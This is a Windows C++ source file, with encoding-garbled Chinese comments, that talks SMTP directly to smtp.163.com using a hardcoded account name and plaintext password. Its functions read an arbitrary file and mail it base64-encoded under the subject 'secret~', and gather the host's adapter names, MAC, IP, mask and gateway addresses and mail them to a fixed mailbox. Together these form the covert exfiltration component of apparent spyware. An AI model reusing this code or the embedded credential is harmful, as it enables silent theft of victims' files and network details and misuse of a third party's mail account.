
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <WinSock.h>
#include <Iphlpapi.h>
using namespace std;


/*
#pragma��һ��Ԥ����ָ���Ѻ����ֵ������������
���Ԥ����ָ����������������ṩ������Ϣ�ı�׼������
�������ָ��C��׼��û����ȷ�涨�����Բ�ͬ������ʵ���ǲ�ͬ�ġ�
ͬһ��#pragma�����һ��������������ȫû����������ǲ�ͬ���塣
��ʽһ��Ϊ: #pragma Para������Para Ϊ������
*/
#pragma  comment(lib, "ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib") //��Ҫ���Iphlpapi.lib��
// Э���м��ܲ���ʹ�õ���base64����
char ConvertToBase64(char   c6);
void EncodeBase64(char   *dbuf, char *buf128, int len);

BOOL SendMailWithAttach(char *email, char *body, char*DataUrl);

int OpenSocket(struct sockaddr *addr)
{
	int sockfd = 0;
	sockfd = socket(PF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		cout << "Open sockfd(TCP) error!" << endl;
		exit(-1);
	}
	if (connect(sockfd, addr, sizeof(struct sockaddr)) < 0)
	{
		cout << "Connect sockfd(TCP) error!" << endl;
		exit(-1);
	}
	return sockfd;
}
struct Base64Date6
{
	unsigned int d4 : 6;
	unsigned int d3 : 6;
	unsigned int d2 : 6;
	unsigned int d1 : 6;
};

BOOL SendAttachFile(char * UserName, char* DataUrl) {
	char EmailTo[] = "qybbbby@163.com";
	char EmailContents[5096];
	strcpy(EmailContents, "From: ");
	strcat(EmailContents, UserName);
	strcat(EmailContents, "<qybbbby@163.com>\r\n"
		"To: \"dasiy\"<qybbbby@163.com>\r\n"
		"Subject:secret~\r\n"
		"Date: Fri, 8 Jan 2010 16 : 12 : 30\r\n"
		"X-Mailer: Qybbbby's mailer\r\n"
		"MIME-Version: 1.0\r\n"
		"Content-type: multipart/mixed; boundary=\"#BOUNDARY#\"\r\n\r\n"
		"Content-Transfer-Encoding:7bit\r\n\r\n"               //Don't know it's necessary
		"This is a multi-part message in MIME format\r\n\r\n"
		//�����ʼ�����ͷ����Ϣ
		"--#BOUNDARY#\r\n"
		"Content-Type: text/plain;charset=gb2312\r\n"
		"Content-Transfer-Encoding:printable\r\n\r\n"
		//�����ʼ������ݲ���
		"0 0\r\n"
		//���͸���ͷ����Ϣ
		"--#BOUNDARY#\r\n"
		"Content-Type:text/plain;name=a.txt\r\n"
		"Content-Transfer-Encoding:base64\r\n"
		"Content-Disposition:attachment;filename=\"a.txt\"\r\n\r\n");

	BOOL flag;
	flag = SendMailWithAttach(EmailTo, EmailContents, DataUrl);
	return flag;
}

char ConvertToBase64(char uc)
{
	if (uc < 26)
	{
		return 'A' + uc;
	}
	if (uc < 52)
	{
		return 'a' + (uc - 26);
	}
	if (uc < 62)
	{
		return '0' + (uc - 52);
	}
	if (uc == 62)
	{
		return '+';
	}
	return '/';
}

// base64��ʵ��
void EncodeBase64(char *dbuf, char *buf128, int len)
{
	struct Base64Date6 *ddd = NULL;
	int           i = 0;
	char          buf[256] = { 0 };
	char          *tmp = NULL;
	char          cc = '\0';

	memset(buf, 0, 256);
	strcpy_s(buf, 256, buf128);
	for (i = 1; i <= len / 3; i++)
	{
		tmp = buf + (i - 1) * 3;
		cc = tmp[2];
		tmp[2] = tmp[0];
		tmp[0] = cc;
		ddd = (struct Base64Date6 *)tmp;
		dbuf[(i - 1) * 4 + 0] = ConvertToBase64((unsigned int)ddd->d1);
		dbuf[(i - 1) * 4 + 1] = ConvertToBase64((unsigned int)ddd->d2);
		dbuf[(i - 1) * 4 + 2] = ConvertToBase64((unsigned int)ddd->d3);
		dbuf[(i - 1) * 4 + 3] = ConvertToBase64((unsigned int)ddd->d4);
	}
	if (len % 3 == 1)
	{
		tmp = buf + (i - 1) * 3;
		cc = tmp[2];
		tmp[2] = tmp[0];
		tmp[0] = cc;
		ddd = (struct Base64Date6 *)tmp;
		dbuf[(i - 1) * 4 + 0] = ConvertToBase64((unsigned int)ddd->d1);
		dbuf[(i - 1) * 4 + 1] = ConvertToBase64((unsigned int)ddd->d2);
		dbuf[(i - 1) * 4 + 2] = '=';
		dbuf[(i - 1) * 4 + 3] = '=';
	}
	if (len % 3 == 2)
	{
		tmp = buf + (i - 1) * 3;
		cc = tmp[2];
		tmp[2] = tmp[0];
		tmp[0] = cc;
		ddd = (struct Base64Date6 *)tmp;
		dbuf[(i - 1) * 4 + 0] = ConvertToBase64((unsigned int)ddd->d1);
		dbuf[(i - 1) * 4 + 1] = ConvertToBase64((unsigned int)ddd->d2);
		dbuf[(i - 1) * 4 + 2] = ConvertToBase64((unsigned int)ddd->d3);
		dbuf[(i - 1) * 4 + 3] = '=';
	}
	return;
}
BOOL SendMailWithAttach(char *email, char *body, char*DataUrl)
{
	int     sockfd = { 0 };
	char    buf[5096] = { 0 };
	char    rbuf[1500] = { 0 };
	char    login[128] = { 0 };
	char    pass[128] = { 0 };
	WSADATA WSAData;
	struct sockaddr_in their_addr = { 0 };
	WSAStartup(MAKEWORD(2, 2), &WSAData);
	memset(&their_addr, 0, sizeof(their_addr));

	their_addr.sin_family = AF_INET;
	their_addr.sin_port = htons(25);
	hostent* hptr = gethostbyname("smtp.163.com");
	if (hptr == 0)
	{
		return FALSE;
	}
	memcpy(&their_addr.sin_addr.S_un.S_addr, hptr->h_addr_list[0], hptr->h_length);
	printf("IP of smpt.163.com is : %d:%d:%d:%d\n",
		their_addr.sin_addr.S_un.S_un_b.s_b1,
		their_addr.sin_addr.S_un.S_un_b.s_b2,
		their_addr.sin_addr.S_un.S_un_b.s_b3,
		their_addr.sin_addr.S_un.S_un_b.s_b4);

	// �����ʼ���������������Ӻ�û����Ӧ����2 �����������
	sockfd = OpenSocket((struct sockaddr *)&their_addr);
	int a = 0;
	memset(rbuf, 0, 1500);
	while (recv(sockfd, rbuf, 1500, 0) == 0)
	{
		a++;
		cout << "reconnect..." << endl;
		Sleep(2);
		sockfd = OpenSocket((struct sockaddr *)&their_addr);
		memset(rbuf, 0, 1500);
		if (a > 5)
		{
			return FALSE;
		}
	}
	FILE* pf = fopen(DataUrl, "rb");
	if (pf == NULL)
	{
		return FALSE;
	}
	fseek(pf, 0, SEEK_END);
	int filelen = ftell(pf);
	char* filebuf = (char*)malloc(filelen);
	char* filebase64 = (char*)malloc(filelen * 2 + 10);
	memset(filebase64, 0, filelen * 2);
	fseek(pf, 0, SEEK_SET);
	fread(filebuf, 1, filelen, pf);
	EncodeBase64(filebase64, filebuf, filelen);
	strcat(filebase64, "\r\n.\r\n");
	cout << rbuf << endl;

	// EHLO
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "EHLO HYL-PC\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "EHLO REceive: " << rbuf << endl;

	// AUTH LOGIN
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "AUTH LOGIN\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Auth Login Receive: " << rbuf << endl;

	// USER
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "qybbbby@163.com");//��������˺�
	memset(login, 0, 128);
	EncodeBase64(login, buf, strlen(buf));
	sprintf_s(buf, 1500, "%s\r\n", login);
	send(sockfd, buf, strlen(buf), 0);
	cout << "Base64 UserName: " << buf << endl;
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "User Login Receive: " << rbuf << endl;

	// PASSWORD
	sprintf_s(buf, 1500, "Summer657703");//�����������
	memset(pass, 0, 128);
	EncodeBase64(pass, buf, strlen(buf));
	sprintf_s(buf, 1500, "%s\r\n", pass);
	send(sockfd, buf, strlen(buf), 0);
	cout << "Base64 Password: " << buf << endl;

	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Password Receive: " << rbuf << endl;

	// MAIL FROM
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "MAIL FROM: <qybbbby@163.com>\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "set Mail From Receive: " << rbuf << endl;

	// RCPT TO ��һ���ռ���
	sprintf_s(buf, 1500, "RCPT TO:<%s>\r\n", email);
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Tell Sendto Receive: " << rbuf << endl;

	// DATA ׼����ʼ�����ʼ�����
	sprintf_s(buf, 1500, "DATA\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Mail Prepare Receive: " << rbuf << endl;

	// �����ʼ����ݣ�\r\n.\r\n���ݽ������
	sprintf_s(buf, 5096, "%s\r\n", body);
	send(sockfd, buf, strlen(buf), 0);
	//memset(rbuf, 0, 1500);
	//recv(sockfd, rbuf, 1500, 0);
	//cout << "Send Mail Receive: " << rbuf << endl;


	send(sockfd, filebase64, strlen(filebase64), 0);//�����ʼ�������
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Mail Receive: " << rbuf << endl;

	// QUIT
	sprintf_s(buf, 1500, "QUIT\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Quit Receive: " << rbuf << endl;

	//������
	closesocket(sockfd);
	WSACleanup();
	return TRUE;
}

// �����ʼ�
BOOL SendMail(char *email, char *body)
{
	int     sockfd = { 0 };
	char    buf[5096] = { 0 };
	char    rbuf[1500] = { 0 };
	char    login[128] = { 0 };
	char    pass[128] = { 0 };
	WSADATA WSAData;
	struct sockaddr_in their_addr = { 0 };
	WSAStartup(MAKEWORD(2, 2), &WSAData);
	memset(&their_addr, 0, sizeof(their_addr));

	their_addr.sin_family = AF_INET;
	their_addr.sin_port = htons(25);
	hostent* hptr = gethostbyname("smtp.163.com");
	if (hptr == NULL)
	{
		return FALSE;
	}
	memcpy(&their_addr.sin_addr.S_un.S_addr, hptr->h_addr_list[0], hptr->h_length);
	printf("IP of smpt.163.com is : %d:%d:%d:%d\n",
		their_addr.sin_addr.S_un.S_un_b.s_b1,
		their_addr.sin_addr.S_un.S_un_b.s_b2,
		their_addr.sin_addr.S_un.S_un_b.s_b3,
		their_addr.sin_addr.S_un.S_un_b.s_b4);

	// �����ʼ���������������Ӻ�û����Ӧ����2 �����������
	sockfd = OpenSocket((struct sockaddr *)&their_addr);
	int a = 0;
	memset(rbuf, 0, 1500);
	while (recv(sockfd, rbuf, 1500, 0) == 0)
	{
		a++;
		cout << "reconnect..." << endl;
		Sleep(2);
		sockfd = OpenSocket((struct sockaddr *)&their_addr);
		memset(rbuf, 0, 1500);
		if (a > 5)
		{
			return FALSE;
		}
	}

	cout << rbuf << endl;

	// EHLO
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "EHLO HYL-PC\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "EHLO REceive: " << rbuf << endl;

	// AUTH LOGIN
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "AUTH LOGIN\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Auth Login Receive: " << rbuf << endl;

	// USER
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "qybbbby@163.com");//��������˺�
	memset(login, 0, 128);
	EncodeBase64(login, buf, strlen(buf));
	sprintf_s(buf, 1500, "%s\r\n", login);
	send(sockfd, buf, strlen(buf), 0);
	cout << "Base64 UserName: " << buf << endl;
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "User Login Receive: " << rbuf << endl;

	// PASSWORD
	sprintf_s(buf, 1500, "Summer657703");//�����������
	memset(pass, 0, 128);
	EncodeBase64(pass, buf, strlen(buf));
	sprintf_s(buf, 1500, "%s\r\n", pass);
	send(sockfd, buf, strlen(buf), 0);
	cout << "Base64 Password: " << buf << endl;

	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Password Receive: " << rbuf << endl;

	// MAIL FROM
	memset(buf, 0, 1500);
	sprintf_s(buf, 1500, "MAIL FROM: <qybbbby@163.com>\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "set Mail From Receive: " << rbuf << endl;

	// RCPT TO ��һ���ռ���
	sprintf_s(buf, 1500, "RCPT TO:<%s>\r\n", email);
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Tell Sendto Receive: " << rbuf << endl;

	// DATA ׼����ʼ�����ʼ�����
	sprintf_s(buf, 1500, "DATA\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Mail Prepare Receive: " << rbuf << endl;

	// �����ʼ����ݣ�\r\n.\r\n���ݽ������
	sprintf_s(buf, 5096, "%s\r\n.\r\n", body);
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Send Mail Receive: " << rbuf << endl;
	// QUIT
	sprintf_s(buf, 1500, "QUIT\r\n");
	send(sockfd, buf, strlen(buf), 0);
	memset(rbuf, 0, 1500);
	recv(sockfd, rbuf, 1500, 0);
	cout << "Quit Receive: " << rbuf << endl;

	//������
	closesocket(sockfd);
	WSACleanup();
	return TRUE;
}

BOOL SendIpInformation(char *UserName) {
	char buff[4096];
	char buf[128];
	memset(buff, 0, 4096);
	//PIP_ADAPTER_INFO�ṹ��ָ��洢����������Ϣ
	PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
	//�õ��ṹ���С,����GetAdaptersInfo����
	unsigned long stSize = sizeof(IP_ADAPTER_INFO);
	//����GetAdaptersInfo����,���pIpAdapterInfoָ�����;����stSize��������һ��������Ҳ��һ�������
	int nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	//��¼��������
	int netCardNum = 0;
	//��¼ÿ�������ϵ�IP��ַ����
	int IPnumPerNetCard = 0;
	if (ERROR_BUFFER_OVERFLOW == nRel)
	{
		//����������ص���ERROR_BUFFER_OVERFLOW
		//��˵��GetAdaptersInfo�������ݵ��ڴ�ռ䲻��,ͬʱ�䴫��stSize,��ʾ��Ҫ�Ŀռ��С
		//��Ҳ��˵��ΪʲôstSize����һ��������Ҳ��һ�������
		//�ͷ�ԭ�����ڴ�ռ�
		delete pIpAdapterInfo;
		//���������ڴ�ռ������洢����������Ϣ
		pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
		//�ٴε���GetAdaptersInfo����,���pIpAdapterInfoָ�����
		nRel = GetAdaptersInfo(pIpAdapterInfo, &stSize);
	}
	if (ERROR_SUCCESS == nRel)
	{
		//���������Ϣ
		//�����ж�����,���ͨ��ѭ��ȥ�ж�
		while (pIpAdapterInfo)
		{
			wsprintf(buf, "����index��%d\n\r", ++netCardNum);
			strcat(buff, buf);
			wsprintf(buf, "�������ƣ�%s\n\r", pIpAdapterInfo->AdapterName);
			strcat(buff, buf);
			wsprintf(buf, "����������%s\n\r", pIpAdapterInfo->Description);
			strcat(buff, buf);
			switch (pIpAdapterInfo->Type)
			{
			case MIB_IF_TYPE_OTHER:
				wsprintf(buf, "�������ͣ�OTHER\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_ETHERNET:
				wsprintf(buf, "�������ͣ�ETHERNET\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_TOKENRING:
				wsprintf(buf, "�������ͣ�TOKENRING\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_FDDI:
				wsprintf(buf, "�������ͣ�FDDI\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_PPP:
				wsprintf(buf, "�������ͣ�PPP\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_LOOPBACK:
				wsprintf(buf, "�������ͣ�LOOPBACK\n\r");
				strcat(buff, buf);
				break;
			case MIB_IF_TYPE_SLIP:
				wsprintf(buf, "�������ͣ�SLIP\n\r");
				strcat(buff, buf);
				break;
			default:

				break;
			}
			wsprintf(buf, "����MAC��ַ��");
			strcat(buff, buf);
			for (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)
				if (i < pIpAdapterInfo->AddressLength - 1)
				{
					wsprintf(buf, "%02X-", pIpAdapterInfo->Address[i]);
					strcat(buff, buf);
				}
				else
				{
					wsprintf(buf, "%02X\n", pIpAdapterInfo->Address[i]);
					strcat(buff, buf);
				}
			wsprintf(buf, "����IP��ַ���£�\n\r");
			strcat(buff, buf);
			//���������ж�IP,���ͨ��ѭ��ȥ�ж�
			IP_ADDR_STRING *pIpAddrString = &(pIpAdapterInfo->IpAddressList);
			do
			{
				wsprintf(buf, "IP ��ַ��%s\n\r", pIpAddrString->IpAddress.String);
				strcat(buff, buf);
				wsprintf(buf, "������ַ��%s\n\r", pIpAddrString->IpMask.String);
				strcat(buff, buf);
				wsprintf(buf, "���ص�ַ��%s\n\r", pIpAdapterInfo->GatewayList.IpAddress.String);
				strcat(buff, buf);
				pIpAddrString = pIpAddrString->Next;
			} while (pIpAddrString);
			pIpAdapterInfo = pIpAdapterInfo->Next;
			strcat(buff, "--------------------------------------------------------------------\n");
		}

	}
	//�ͷ��ڴ�ռ�
	if (pIpAdapterInfo)
	{
		delete pIpAdapterInfo;
	}
	char EmailTo[] = "qybbbby@163.com";
	char EmailContents[5096];
	"From: \"lucy\"<qybbbby1@163.com>\r\n"
		"To: \"dasiy\"<qybbbby@163.com>\r\n"
		;
	strcpy(EmailContents, "From: ");
	strcat(EmailContents, UserName);
	strcat(EmailContents, "<qybbbby1@163.com>\r\n"
		"To: \"dasiy\"<qybbbby@163.com>\r\n"
		"Subject:Up\r\n"
	);
	strcat(EmailContents, buff);
	return SendMail(EmailTo, EmailContents);
}